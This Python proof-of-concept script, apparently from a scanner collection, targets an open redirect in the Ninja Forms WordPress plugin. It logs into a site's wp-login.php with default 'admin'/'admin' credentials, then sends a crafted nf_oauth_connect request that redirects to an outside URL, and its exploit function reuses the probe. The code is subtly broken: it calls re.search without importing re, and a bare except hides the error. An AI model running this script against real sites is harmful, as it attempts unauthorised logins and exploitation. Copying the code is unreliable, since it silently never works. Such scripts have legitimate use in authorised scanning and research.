import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Ninja Forms < 3.4.34 - Administrator Open Redirect''',
        "description": '''The wp_ajax_nf_oauth_connect AJAX action was vulnerable to open redirect due to the use of a user supplied redirect parameter and no protection in place.''',
        "severity": "medium",
        "references": [
            "https://wpscan.com/vulnerability/6147acf5-e43f-47e6-ab56-c9c8be584818"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["wordpress", "redirect", "wp-plugin", "ninjaform", "authenticated"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    username = "admin"
    password = "admin"
    try:
        url = format_url(url)

        s = requests.Session()

        path = """/wp-login.php"""
        method = "POST"
        data = """log={username}&pwd={password}&wp-submit=Log+In&testcookie=1""".format(username=username, password=password)
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': 'wordpress_test_cookie=WP%20Cookie%20check'}
        resp0 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/wp-admin/admin-ajax.php?client_id=1&redirect=https://google.com&action=nf_oauth_connect"""
        method = "GET"
        data = """"""
        headers = {}
        resp1 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (re.search(r"""(?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]*)google\.com\/?(\/|[^.].*)?$""",str(resp1.headers))):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url